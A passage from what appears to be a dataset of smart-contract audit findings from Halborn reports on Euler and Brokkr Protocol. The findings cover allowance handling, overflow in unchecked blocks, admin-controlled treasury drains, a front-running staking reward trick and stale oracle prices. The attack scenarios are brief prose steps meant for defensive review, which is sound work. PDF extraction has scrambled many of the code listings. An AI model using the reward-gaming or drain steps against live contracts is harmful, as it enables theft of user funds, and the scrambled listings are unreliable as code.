Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to be consistent in the code and make sure that 0 indices are correctly checked and always kept in mind. Not being consistent on the usage of the indices could lead to out-of-bounds access or unexpected behaviours. Remediation Plan: RISK ACCEPTED: This is intentional. Thats why there is the explicit if condition for this on line 94 of Listing 34. The reason is that the first market entered is packed into a slot with other fields. If any of them are non-zero then there will be no refund issued. Secondly, by leaving it non-zero, it will be cheaper to enter a market in the future. Since exit market operations can be done in a transaction that uses a very small amount of gas, it is possible that the storage refund will not be fully claimable (refunds are only claimable up to half a transactions gas usage), so in these cases exiting and entering a market actually nets out to be cheaper if left set. Avoiding un-claimable refunds is the same reason that the re-entrancy guard uses the values 1 and 2, rather than 0 and 1. 24 ", "labels": ["Halborn", "Euler", "Severity: Informational"]}, {"title": "INVALID CONSTANT VALUE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Euler_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "During a manual static review, the tester noticed that the constant value defined in all the interest-rate-models contracts are returning a dif- ferent value than the one described on the comments. The comment states that the value is the result of the 10% APR = 1e27 * 0.1 / (86400*365) operation resulting in 3170979198376458650 on the code. However, the re- sult of the previous stated operation is 3170979198376458752 a difference of 102 units. Code Location: Listing 35: IRMDefault.sol 9 uint internal constant MAX_IR = 3170979198376458650; // 10% APR = 1 e27 * 0.1 / (86400*365) Listing 36: IRMLinear.sol 13 uint internal constant MAX_IR = 3170979198376458650; // 10% APR = 1 e27 * 0.1 / (86400*365) Listing 37: IRMFixed.sol 14 return 3170979198376458650; // 10% APR = 1 e27 * 0.1 / (86400*365) Listing 38: IRMLinearRecursive.sol 12 int internal constant MAX_IR = 3170979198376458650; // 10% APR = 1 e27 * 0.1 / (86400*365) 25 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to either fix the comment with the correct operation or change the constant value to reflect the described operation. Remediation Plan: RISK ACCEPTED: The comment and constant values are correct. The python code that demonstrates this is experiencing floating point rounding error. Double precision floating point has a precision of approximately 16 decimal places, which is why you observe it as off by about 2 decimal places. ", "labels": ["Halborn", "Euler", "Severity: Informational"]}, {"title": "INFINITE ALLOWANCE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Euler_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "Setting the allowance value to -1 or MAX UINT 256 on the EToken and DToken contract does allow the spender to keep performing transfers until a new approval is set on the spender. Code Location: Listing 39: EToken.sol (Lines 186) 186 187 if (! isSubAccountOf ( msgSender , from ) && assetStorage . eTokenAllowance [ from ][ msgSender ] != type ( uint ). max ) { require ( assetStorage . eTokenAllowance [ from ][ msgSender ] >= amount , \"e / insufficient - allowance \"); 26 188 189 } unchecked { assetStorage . eTokenAllowance [ from ][ msgSender ] -= amount ; } Listing 40: DToken.sol (Lines 165) 165 166 167 168 if (! isSubAccountOf ( msgSender , to ) && assetStorage . dTokenAllowance [ to ][ msgSender ] != type ( uint ). max ) { require ( assetStorage . dTokenAllowance [ to ][ msgSender ] >= amount , \"e / insufficient - allowance \"); unchecked { assetStorage . dTokenAllowance [ to ][ msgSender ] -= amount ; } } Risk Level: Likelihood - 1 Impact - 1 Recommendations: Follow the standard ERC20 practices and allow the user to increase and decrease the approval amount (see increaseApproval and decreaseApproval of StandardToken.sol#L63-L98). If this is not possible, ensure users are aware of this extra functionality Furthermore, it is and encourage them to use it when appropriate. preferable to periodically increase the allowance rather than disabling the allowance feature by using a max value. Remediation Plan: RISK ACCEPTED: This is intentional. For better or for worse, the in- crease/decreaseAllowance methods are almost never used in real-life, and users almost always authorise infinite allowance to contracts (probably because by convention it is cheaper to interact with tokens in this state since they dont bother decrementing the allowance). 27 MANUAL TESTING 28 During the manual testing multiple questions where considered while eval- uation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Can it be called twice in the same block and cause issues?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation . . .  Are the function parameters and variables controlled by external contracts?  Can extended contracts cause issues on the extender contract?  Can we bypass Proxy restrictions and interact with the contract directly? During the initial steps, coverage information was taken from the hardhat test cases. The uncovered lines were manually tested and kept in mind for logic errors and possible side-effects during the execution of the contracts. This information can be seen in 41. Listing 41 | 1 - - - - - - - - - - - - - - - - - - - - - - - - - - - - -| - - - - - - - - - -| - - - - - - - - - - - - - - - -| 2 File % Lines | Uncovered Lines | 3 - - - - - - - - - - - - - - - - - - - - - - - - - - - - -| - - - - - - - - - -| - - - - - - - - - - - - - - - -| | 4 92 | 5 6 | 150 ,433 ,434 | 7 | 8 | 9 21 | 10 | 11 | 12 | 13 | 14 160 ,167 | 15 | 16 contracts / Base . sol BaseIRM . sol BaseLogic . sol BaseModule . sol Constants . sol Euler . sol Events . sol Interfaces . sol Proxy . sol Storage . sol DToken . sol EToken . sol 97.93 | 95.83 | 100 | 98.43 | 100 | 100 | 92.86 | 100 | 100 | 100 | 100 | 97.22 | 100 | | | | | | | | | | | | | | 29 G N I T S E T L A U N A M | Exec . sol | Governance . sol | Installer . sol | Liquidation . sol | Markets . sol | RiskManager . sol | IRMFixed . sol | IRMLinear . sol | IRMLinearRecursive . sol | IRMZero . sol | InvariantChecker . sol | JunkETokenUpgrade . sol | JunkMarketsUpgrade . sol | LiquidationTest . sol | MockUniswapV3Factory . sol MockUniswapV3Pool . sol | SimpleUniswapPeriphery . sol | | TestERC20 . sol | RPow . sol | TickMath . sol | EulerGeneralView . sol 80.88 |... 84 ,90 ,92 ,94 | 17 | 100 | 18 83.33 | 33 ,34 | 19 95.29 |123 ,125 ,150 ,151 | 20 92.16 | 77 ,144 ,145 ,146 | 21 71 ,73 ,171 ,196 | 96.19 | 22 | 100 | 23 | 100 | 24 15 ,16 | 0 | 25 | 100 | 26 0 |... 84 ,87 ,90 ,93 | 27 | 100 | 28 | 100 | 29 55 | 93.75 | 30 | 100 | 31 89.47 | 40 ,44 | 32 58.82 |... 60 ,68 ,81 ,84 | 33 80 | 39 ,40 ,56 ,65 ,73 | 34 | 35 | 36 37 95 ,96 ,98 ,100 | 38 - - - - - - - - - - - - - - - - - - - - - - - - - - - - -| - - - - - - - - - -| - - - - - - - - - - - - - - - -| 39 All files | 40 - - - - - - - - - - - - - - - - - - - - - - - - - - - - -| - - - - - - - - - -| - - - - - - - - - - - - - - - -| 100 | 100 | 90.48 | 88.93 | | Some logical ideas were manually tested which include but not limited to:  unpackTrailingParams does some validations, but can it be crafted to cause errors?  Can module and proxy dependency be bypassed.  Can I activate an Etoken and Dtoken token on the market causing underlying miscalculations.  Decimal wrapping issues on Etokens if the underlying has different decimal places.  Bad balance interpretation of token on callBalanceOf.  What if the token contract is destroyed?  Use of unchecked bypassing SafeMath integration could lead to issues. G N I T S E T L A U N A M 30 Architecture overview: Except for a small amount of dispatching logic (see Euler.sol), the contracts are organised into modules, which live in contracts/modules/.  Each token must have its own address to conform to ERC-20, even though all storage lives inside the Euler contract The modules are divided in 3 categories:  Single-proxy modules: These are modules that are only accessible by a single address. For example, market activation is done by invoking a function on the single proxy for the Markets module. The IDs range is from 1 to 499,999.  Multi-proxy modules: These are modules that have many addresses. For example, each EToken gets an address, but any calls to them are dispatched to the single EToken module instance. The IDs range is from 500,000 to 999,999.  Internal modules: These are modules that are called internally by the Euler system and dont have any public proxies. These are only useful for their upgrade functionality, and the ability to stub in non-production code during testing/development. Examples are the RiskManager and interest rate model (IRM) modules. The IDs range is from 1,000,000 onwards. Since modules are invoked by delegatecall, they should not have any storage-related initialisation in their constructors (Otherwise collision The only thing that should be done in storage issues could happen). their constructors is to initialise immutable variables, since these are embedded into the contracts bytecode, not storage. Modules also should not define any storage variables. In the rare cases they need private storage (ie interest rate model state), they should use unstructured storage. G N I T S E T L A U N A M 31 Proxy Calling contract: If the caller of the proxy is the deployer, the proxy copies the calldata on address 0x1f causing the first byte to be misaligned using calldatacopy This first byte is then read and used on a (31, 0, calldatasize()). switch-case statement for logging purposes. If the caller is not the deployer, the dispatch function is then called with the original calldata used. 4.1 General issues while manually testing  trustedSenders for the installer module has the moduleImpl set to 0 on the Euler contract.  This happens because the proxy is created on the Euler contract creation with _createProxy which sets the struct moduleImpl to 0. The only time that the moduleImpl variable is set is during the call to installModules on Installer.sol. This means that all installed modules will have the moduleImpl variable set but not the Installer module as seen in Figure 1 and Figure 2. An expected code should be similar to the Listing 42. Listing 42: Expected code for the installer module added trustedSenders on the Euler constructor 1 2 address installerProxy = _createProxy ( MODULEID__INSTALLER ); trustedSenders [ installerProxy ]. moduleImpl = installerModule ; Figure 1: Code used to access the trustedSenders mapping  All Proxy creator should be set to Euler address. 32 G N I T S E T L A U N A M Figure 2: implementation is 0 Screenshot showing that the Installer trustedSenders It was observed that when creating the proxies for the activateMarket the trustedSenders mapping moduleImpl for the EToken and DToken module was not set. It was deduced that it should be at 0 since multiple implementations for them exists, aka multi-proxy. Figure 3: Screenshot showing that the implmentation of the Dtoken is set to 0 Successfully entering the market: G N I T S E T L A U N A M Figure 4: Successful transaction showing a enter market call BaseLogic: If numMarketsEntered is 1, the lastMarketIndex will be 0 causing the _setEnteredMarketIndex to not happen. This issue is shown as informative on the report.  ETokens and DTokens cannot be added as an active market since they 33 are checked using trustedSenders.  IRMFixed.sol and IRMLinear 3170979198376458650; // 10% APR = 1e27 * 0.1 / (86400*365) should be, this is reflected in an informative issue on the report. Listing 43 1 >>> int (1 e27 * 0.1 / (86400*365) ) 2 3170979198376458752 E-token deposit: Directly calling the implementation without passing though the proxy is causing reentrancy: Figure 5: manual/Untitled%205.png Multiplication on division: During automated testing multiple multiplication on division issues were found. Those issues were manually analyzed and were identified as not problematic since the truncation is done on purpose to round up internal representations. The function was compiled and bytecode analyzed in order to illustrate the opcode order as shown in Figure 6. Unchecked: The solidity version used 0.8.0 has SafeMath integration which performs arithmetic checks on each of the typed operations. A new keyword, named G N I T S E T L A U N A M 34 Figure 6: division Showing that the multiplication opcode is done after the unchecked was added in order to remove those security checks causing gas costs to decrease. All the unchecked usages are displayed in Listing 44. Listing 44: Unchecked keyword usage 1 BaseLogic . sol 2 143: unchecked { assetCache . underlyingDecimalsScaler = 10**(18 - underlyingDecimals ); } 3 148: unchecked { assetCache . poolSize = poolSize * assetCache . underlyingDecimalsScaler ; } 4 175: unchecked { scaledAmount = externalAmount * assetCache . underlyingDecimalsScaler ; } 5 248: unchecked { newFromBalance = origFromBalance - amount ; } 6 287: // unchecked is OK here since owed is always loaded from storage , so we know it fits into a uint144 ( pre - interest accural ) 7 293: 8 400: 9 429: 10 469: unchecked { unchecked { owedRemaining = owedRoundedUp - amount ; } unchecked { newFromBorrow = origFromBorrow - amount ; } unchecked { amountTransferred = poolSizeAfter - poolSizeBefore ; } 35 G N I T S E T L A U N A M 11 479: unchecked { amountTransferred = poolSizeBefore - poolSizeAfter ; } 12 13 vendor / TickMath . sol 14 7: // * Wrapped function bodies with \" unchecked {}\" so as to not add any extra gas costs unchecked { unchecked { 15 31: 16 71: 17 18 halborn / ERC20Example . sol 19 124: * Using this library instead of the unchecked operations eliminates an entire 20 21 modules / EToken . sol 22 91: 23 178: unchecked { unchecked { assetStorage . eTokenAllowance [ from ][ msgSender ] -= amount ; } 24 25 modules / DToken . sol 26 167: unchecked { assetStorage . dTokenAllowance [ to ][ msgSender ] -= amount ; } 27 28 modules / RiskManager . sol unchecked { 29 105: The code does use int96 very nicely, no issue with max values being overflowed or underflowed by truncating uint to int or the other way around. Could potentially overflow if owed is to large: Listing 45: Possible overflow (Lines 295) 290 function roundUpOwed ( AssetCache memory assetCache , uint owed ) internal pure returns ( uint ) { if ( owed == 0) return 0; unchecked { // max scale -> 0 x33b2e3c9fd0803ce8000000 --->>> 1 e9 * (10 ** 18) uint scale = INTERNAL_DEBT_PRECISION * assetCache . underlyingDecimalsScaler ; return ( owed + scale - 1) / scale * scale ; 291 292 293 294 295 296 36 G N I T S E T L A U N A M 297 298 } } As an example if owed is the following value: Listing 46 1 MAX_UINT256 - scale + 1 2 3 max scale -> 0 x33b2e3c9fd0803ce8000000 --->>> 1 e9 * (10 ** 18) 4 5 (2 ** 256) - 0 x33b2e3c9fd0803ce8000000 + 1 The roundUpOwed will be 0. Causing a division by zero error. To summarize if owed is larger than MAX_UINT256 - scale + 1 the operation will overflow and wrap around. As an example, by using the code shown in Listing 47 and by exceeding the cache maxExternalAmount value of the underlying asset the code was able to detect the overflow as shown in Figure 7. Listing 47: Function used to load the asset cache values 1 2 3 4 5 6 7 function halborn_cache () external returns ( AssetCache memory assetCache ) { ( address underlying , AssetStorage storage assetStorage , address proxyAddr , address msgSender ) = CALLER () ; AssetCache memory assetCache = loadAssetCache ( underlying , assetStorage ); return assetCache ; } 37 G N I T S E T L A U N A M Figure 7: Example transactions that lead to the detection of an overflow on the maxExternalAmount cache G N I T S E T L A U N A M 38 ", "labels": ["Halborn", "Euler", "Severity: Informational"]}, {"title": "POSSIBILITY TO TRANSFER AN ARBITRARY AMOUNT OF TOKENS OUT OF SOME CONTRACTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The bonding-v1 and mvp-treasury contracts allow an admin (Brokkr team) to transfer an arbitrary amount of tokens out of them. Two possible attack scenarios will be described below. Attack scenario 1: 1. A malicious (or compromised) admin calls the update_config function in the bonding-v1 contract to change the value of treasury_contract to an address controlled by him. 2. As a consequence of Step 1, every time users provide LP tokens or UST to bonding-v1 contract, they will be transferred to the malicious address. Attack scenario 2: 1. A malicious (or compromised) admin calls the spend function in mvp- treasury contract with recipient = <address_controlled_by_attacker>. 2. As a consequence of Step 1, the aforementioned function could fully drain the mvp-treasury contract. Code Location: malicious A treasury_contract in bonding-v1 to an address controlled by him: compromised) change could admin (or the value of 15 Listing 1: contracts/bonding-v1/src/commands.rs (Line 310) 305 pub fn update_config ( 306 307 308 309 310 deps : DepsMut , owner : Option < String >, lp_token : Option < String >, rewards_pool_contract : Option < String >, treasury_contract : Option < String >, Listing 2: contracts/bonding-v1/src/commands.rs (Lines 334-336) 330 331 if let Some ( rewards_pool_contract ) = rewards_pool_contract { config . rewards_pool_contract = deps . api . addr_canonicalize  (& rewards_pool_contract ) ?; 332 333 334 335 } if let Some ( treasury_contract ) = treasury_contract { config . treasury_contract = deps . api . addr_canonicalize (&  treasury_contract ) ?; 336 } spend function allows a malicious (or compromised) admin to fully drain the mvp-treasury contract: Listing 3: contracts/mvp-treasury/src/commands.rs (Lines 23,37) let balance = queries :: query_asset_balance ( deps . as_ref () , env , return Err ( ContractError :: InsufficientFunds {}) ; deps : DepsMut , env : Env , asset_info : AssetInfo , recipient : String , 19 pub fn spend ( 20 21 22 23 24 ) -> Result < Response , ContractError > { 25  asset_info . clone () ) ?. amount ; 26 27 28 29 30 31 32 33 34 info : asset_info , amount : balance , if balance . is_zero () { let asset = Asset { }; } 16 Ok ( Response :: new () . add_messages ( vec! [ 35 36 37  recipient ) ?) ? 38 39 40 } ]) . add_attributes ( vec! [( \" action \" , \" spend \") ]) ) asset . into_msg (& deps . querier , deps . api . addr_validate (& Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to transfer the ownership of contracts mentioned above to a Governance contract, which will control the changes proposed through a voting process. Otherwise, the following security measures should be applied:  Remove the possibility to update the value of treasury_contract in bonding-v1 contract.  Update the logic of spend function in mvp-treasury contract to verify that the value of recipient belongs to a list of contracts that Brokkr protocol interacts with. This list is defined when mvp-treasury is instantiated and should be non-modifiable.  Brokkr admin should be handled by a multi-sig wallet. Remediation plan: PENDING: The Brokkr team stated that they plan to transfer the ownership of the contracts to a full-fledged governance contract setup in the midterm, which will severely reduce the likelihood of liquidity loss exposure attacks. Meanwhile, they will handle the Brokkr admin by a multisig wallet, as suggested in the recommendation. 17 ", "labels": ["Halborn", "Brokkr_Protocol_P1_Contracts_CosmWasm", "Severity: High"]}, {"title": "BBRO TOKENS ARE LOST WHEN UNSTAKING OR CLAIMING REWARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When a user unstake or claim BRO rewards in staking-v1 contract, his in- formation is totally removed from STAKERS item if the following conditions are true:  Total staked amount is zero  Pending BRO reward is zero Under the mentioned circumstances, the user wont be able to claim his bBRO rewards, even if the amount is greater than zero, i.e.: he totally loses all his bBRO tokens. Code Location: Users information is totally removed from STAKERS item when he unstakes: Listing 4: contracts/staking-v1/src/commands.rs (Lines 279-280) 275 // decrease stake amount 276 state . total_stake_amount = state . total_stake_amount . checked_sub (  amount ) ?; 277 staker_info . unlocked_stake_amount = staker_info .  unlocked_stake_amount . checked_sub ( amount ) ?; 278 279 if staker_info . pending_bro_reward . is_zero () && staker_info .  total_staked () ?. is_zero () { remove_staker_info ( deps . storage , & sender_addr_raw ); 280 281 } else { 282 store_staker_info ( deps . storage , & sender_addr_raw , & staker_info  ) ?; 283 } 18 Users information is totally removed from STAKERS item when he claims his BRO rewards: Listing 5: contracts/staking-v1/src/commands.rs (Lines 385-386) 382 staker_info . pending_bro_reward = Uint128 :: zero () ; 383 staker_info . unlock_expired_lockups (& env . block ) ?; 384 385 if staker_info . total_staked () ?. is_zero () { 386 387 } else { 388 remove_staker_info ( deps . storage , & sender_addr_raw ); store_staker_info ( deps . storage , & sender_addr_raw , & staker_info  ) ?; 389 } Risk Level: Likelihood - 5 Impact - 3 Recommendation: Update the logic of unstake and claim_bro_rewards functions to remove users information from STAKERS item only if, additionally to the already existing conditions, pending_bbro_reward is also zero. Remediation plan: SOLVED: The issue was fixed in commit f9bbc72a85ff872b36691c4992d7a86439a4bba2. 19 ", "labels": ["Halborn", "Brokkr_Protocol_P1_Contracts_CosmWasm", "Severity: High"]}, {"title": "BBRO REWARDS SCHEMA COULD PRODUCE UNFAIR ADVANTAGES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "the calculate of When users stake, the compute_normal_bbro_reward function is called calcu- to lation between depends last_distribution_block and last_balance_update, it is possible the following attack scenario: bBRO bbro_reward of subtraction accrued. on rewards value Because the the Attack scenario: 1. Just after a reward distribution, an attacker stakes 10_000000 BRO (Block height: 200). 2. Attacker waits until there is another reward distribution and he front-runs the transaction to additionally stake 80_000000 BRO be- fore the distribution of BRO tokens (Block height: 700). 3. The attacker unstakes 80_000000 BRO just after the reward distribu- tion (could be even in the same block!). 4. The calculation of his bBRO reward will consider that 90_000000 BRO has been staked for 500 blocks (700 - 200). However, only 10_000000 This situation BRO of the total has been staked for 500 blocks. gives the attacker an unfair advantage. Code Location: Listing 6: contracts/staking-v1/src/state.rs (Lines 157,163-164,169) 155 let stake_amount = self . total_staked () ?; 156 157 if stake_amount . is_zero () || state . last_distribution_block < self .  last_balance_update { 158 return Ok (() ); 20 159 } 160 161 let epoch_info = query_epoch_info ( querier , epoch_manager_contract )  ?; 162 163 let epochs_staked = Uint128 :: from ( state . last_distribution_block -  self . last_balance_update ) . checked_div ( Uint128 :: from ( epoch_info . epoch )) ?; 164 165 166 let bbro_per_epoch_reward = 167 stake_amount . checked_div ( epoch_info . epochs_per_year () )? *  epoch_info . bbro_emission_rate ; 168 169 let bbro_reward = bbro_per_epoch_reward . checked_mul ( epochs_staked )  ?; 170 self . pending_bbro_reward = self . pending_bbro_reward . checked_add (  bbro_reward ) ?; 171 self . last_balance_update = current_block ; 172 173 Ok (() ) Risk Level: Likelihood - 5 Impact - 3 Recommendation: Update the logic of compute_normal_bbro_reward function to consider the block height of each stake when calculating the bBRO rewards. Remediation plan: PARTIALLY SOLVED: The Brokkr team claimed that contracts will be launched to mainnet with the following parameters:  epoch = 17,280 blocks (1 day)  unstake_period_blocks = 241,920 blocks (14 days) 21 Because of this setup, the attack vector mentioned above is not prof- itable unless the rewards are distributed after 14 days, which is highly unlikely, especially with the use of an off-chain trigger (out-of-scope of this audit). If the above-mentioned parameters are subsequently incorrectly changed with the update_config function, this security issue could arise again, so it has been marked as \"Partially Solved\". 22 ", "labels": ["Halborn", "Brokkr_Protocol_P1_Contracts_CosmWasm", "Severity: High"]}, {"title": "PRICES FROM TWAP ORACLE CAN BECOME STALE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "consult_price function in contracts/oracle/src/queries.rs calculates the return value using the price_average stored in oracle contracts storage (PRICE_LAST). However, the function does not previously validate if the price has been updated within a reasonable timeframe. As a consequence, prices calculated in this TWAP oracle can rapidly become stale if users do not bond tokens frequently enough or if Brokkrs off-chain trigger does not work correctly (out-of-scope for this audit), which could affect negatively users operations or protocol funds. Code Location: price_average is extracted from oracle contracts storage (PRICE_LAST) without validating if the price has been updated within a reasonable timeframe: Listing 7: contracts/oracle/src/queries.rs (Lines 47,49,50,52) price_last . price_0_average 46 let config = load_config ( deps . storage ) ?; 47 let price_last = load_price_cumulative_last ( deps . storage ) ?; 48 49 let price_average = if config . asset_infos [0]. equal (& asset ) { 50 51 } else if config . asset_infos [1]. equal (& asset ) { 52 53 } else { 54 55 }; return Err ( StdError :: generic_err ( \" Invalid asset info \" )) ; price_last . price_1_average 23 Return value of consult_price function is calculated using price_average, even if this value is stale: Listing 8: contracts/oracle/src/queries.rs (Lines 74,78) let price_precision = Uint256 :: from (10 _u128 . pow ( TWAP_PRECISION Uint256 :: from ( amount ) * price_average / Decimal256 :: 72 } else { 73  . into () )); 74  from_uint256 ( price_precision ) 75 }; 76 77 Ok ( ConsultPriceResponse { 78 79 }) amount : consult_price . into () , Risk Level: Likelihood - 4 Impact - 3 Recommendation: It is recommended to apply one of the following oracle strategies:  Update the logic of consult_price function to throw an error message if price_average has not been updated within a reasonable timeframe defined in the contract.  If data freshness is more important for Brokkr protocol, an oracle with moving averages can be used instead, in which the cumulative price variable is measured more often than once per period. See the following reference for more details. Remediation plan: SOLVED: The issue was fixed in commit 44a54bddf48a4e28b711449ddcb13d9bf31afdb9. 24 ", "labels": ["Halborn", "Brokkr_Protocol_P1_Contracts_CosmWasm", "Severity: Medium"]}, {"title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "An incorrect use of the update_config function in contracts can set owner to an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the owner of the contracts can change owner address using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  airdrop  bonding-v1  oracle  staking-v1  vesting Code Location: Listing 9: contracts/airdrop/src/commands.rs (Lines 24-26) let mut config = load_config ( deps . storage ) ?; 21 pub fn update_config ( deps : DepsMut , owner : Option < String >) ->  Result < Response , ContractError > { 22 23 24 25 26 config . owner = deps . api . addr_canonicalize (& owner ) ?; if let Some ( owner ) = owner { } 25 Listing 10: contracts/bonding-v1/src/commands.rs (Lines 322-324) deps : DepsMut , owner : Option < String >, lp_token : Option < String >, rewards_pool_contract : Option < String >, treasury_contract : Option < String >, astroport_factory : Option < String >, oracle_contract : Option < String >, ust_bonding_reward_ratio : Option < Decimal >, ust_bonding_discount : Option < Decimal >, lp_bonding_discount : Option < Decimal >, min_bro_payout : Option < Uint128 >, vesting_period_blocks : Option < u64 >, lp_bonding_enabled : Option < bool >, 305 pub fn update_config ( 306 307 308 309 310 311 312 313 314 315 316 317 318 319 ) -> Result < Response , ContractError > { 320 321 322 323 324 if let Some ( owner ) = owner { } let mut config = load_config ( deps . storage ) ?; config . owner = deps . api . addr_canonicalize (& owner ) ?; Listing 11: contracts/oracle/src/commands.rs (Lines 28-30) deps : DepsMut , owner : Option < String >, price_update_interval : Option < u64 >, 21 pub fn update_config ( 22 23 24 25 ) -> Result < Response , ContractError > { 26 27 28 29 30 if let Some ( owner ) = owner { } let mut config = load_config ( deps . storage ) ?; config . owner = deps . api . addr_canonicalize (& owner ) ?; Listing 12: contracts/staking-v1/src/commands.rs (Lines 502-504) 488 pub fn update_config ( 489 490 491 492 deps : DepsMut , owner : Option < String >, paused : Option < bool >, unstake_period_blocks : Option < u64 >, 26 min_staking_amount : Option < Uint128 >, min_lockup_period_epochs : Option < u64 >, max_lockup_period_epochs : Option < u64 >, base_rate : Option < Decimal >, linear_growth : Option < Decimal >, exponential_growth : Option < Decimal >, 493 494 495 496 497 498 499 ) -> Result < Response , ContractError > { 500 501 502 503 504 if let Some ( owner ) = owner { } let mut config = load_config ( deps . storage ) ?; config . owner = deps . api . addr_canonicalize (& owner ) ?; Listing 13: contracts/vesting/src/commands.rs (Lines 71-73) 65 pub fn update_config ( deps : DepsMut , 66 owner : Option < String >, 67 68 genesis_time : Option < u64 >, 69 ) -> Result < Response , ContractError > { 70 71 72 73 } let mut config = load_config ( deps . storage ) ?; if let Some ( owner ) = owner { config . owner = deps . api . addr_canonicalize (& owner ) ?; Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to split owner transfer functionality into set_owner and accept_ownership functions. The latter function allows the transfer to be completed by the recipient. Remediation plan: SOLVED: The issue was fixed in commit 79549c38936e99a89a1fa7aa7e38456032f47389. 27 ", "labels": ["Halborn", "Brokkr_Protocol_P1_Contracts_CosmWasm", "Severity: Medium"]}, {"title": "MISSING VALIDATION FOR BASE RATE AND GROWTH PARAMETERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "instantiate and update_config functions in staking-v1 contract do not validate that values of base_rate, linear_growth or exponential_growth are less or equal than a threshold (e.g.: 0.1) predefined in the contract. The aforementioned values are used to calculate premium bBRO rewards. If those values are not correctly set, the premium bBRO rewards for users could be much higher than expected. Code Location: instantiate function does not validate that base_rate, linear_growth or exponential_growth are less or equal than a predefined threshold: Listing 14: contracts/staking-v1/src/contract.rs (Lines 59-61) deps . storage , & Config { 45 store_config ( 46 47 48 49 50 51  rewards_pool_contract )? , 52  bbro_minter_contract )? , 53  epoch_manager_contract )? , 54 55 56 57 58 59 owner : deps . api . addr_canonicalize (& msg . owner )? , paused : false , bro_token : deps . api . addr_canonicalize (& msg . bro_token )? , rewards_pool_contract : deps . api . addr_canonicalize (& msg . bbro_minter_contract : deps . api . addr_canonicalize (& msg . epoch_manager_contract : deps . api . addr_canonicalize (& msg . unstake_period_blocks : msg . unstake_period_blocks , min_staking_amount : msg . min_staking_amount , lockup_config : LockupConfig { min_lockup_period_epochs : msg . min_lockup_period_epochs , max_lockup_period_epochs : msg . max_lockup_period_epochs , base_rate : msg . base_rate , 28 linear_growth : msg . linear_growth , exponential_growth : msg . exponential_growth , 60 61 62 63 64 ) ?; }, }, update_config function does not validate that base_rate, linear_growth or exponential_growth are less or equal than a predefined threshold: Listing 15: contracts/staking-v1/src/commands.rs (Lines 527,531,535) config . lockup_config . base_rate = base_rate ; 526 if let Some ( base_rate ) = base_rate { 527 528 } 529 530 if let Some ( linear_growth ) = linear_growth { 531 532 } 533 534 if let Some ( exponential_growth ) = exponential_growth { 535 536 } config . lockup_config . linear_growth = linear_growth ; config . lockup_config . exponential_growth = exponential_growth ; Risk Level: Likelihood - 2 Impact - 3 Recommendation: Add a validation routine inside instantiate and update_config functions to ensure that values of base_rate, linear_growth and exponential_growth are less or equal than a threshold predefined in the contract. Remediation plan: SOLVED: The issue was fixed in commit 032d729b4cddd49c990fdb5d9e78c608d21f0d25. 29 ", "labels": ["Halborn", "Brokkr_Protocol_P1_Contracts_CosmWasm", "Severity: Low"]}, {"title": "MISSING VALIDATION FOR BONDING DISCOUNTS AND REWARD RATIO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "instantiate and update_config functions in bonding-v1 contract do not validate that values of ust_bonding_reward_ratio, ust_bonding_discount or lp_bonding_discount are less or equal than 1. The aforementioned values are used to calculate rewards distribution and amounts of BRO tokens to claim. If those values are not correctly set, operations will throw error messages and wont allow legitimate users to claim their rewards, thus generating a denial of service (DoS) in Brokkr protocol. Code Location: instantiate function does not validate that ust_bonding_discount or lp_bonding_discount are less or equal than 1: Listing 16: contracts/bonding-v1/src/contract.rs (Lines 63-64) return Err ( ContractError :: InvalidUstBondRatio {}) ; 46 if msg . ust_bonding_reward_ratio > Decimal :: from_str (\" 1.0 \" )? 47 || msg . ust_bonding_reward_ratio <= Decimal :: zero () 48 { 49 50 } 51 52 store_config ( 53 54 55 56 57 58  rewards_pool_contract )? , owner : deps . api . addr_canonicalize (& msg . owner )? , bro_token : deps . api . addr_canonicalize (& msg . bro_token )? , lp_token : deps . api . addr_canonicalize (& msg . lp_token )? , rewards_pool_contract : deps . api . addr_canonicalize (& msg . deps . storage , & Config { 30 treasury_contract : deps . api . addr_canonicalize (& msg . astroport_factory : deps . api . addr_canonicalize (& msg . oracle_contract : deps . api . addr_canonicalize (& msg . ust_bonding_reward_ratio : msg . ust_bonding_reward_ratio , ust_bonding_discount : 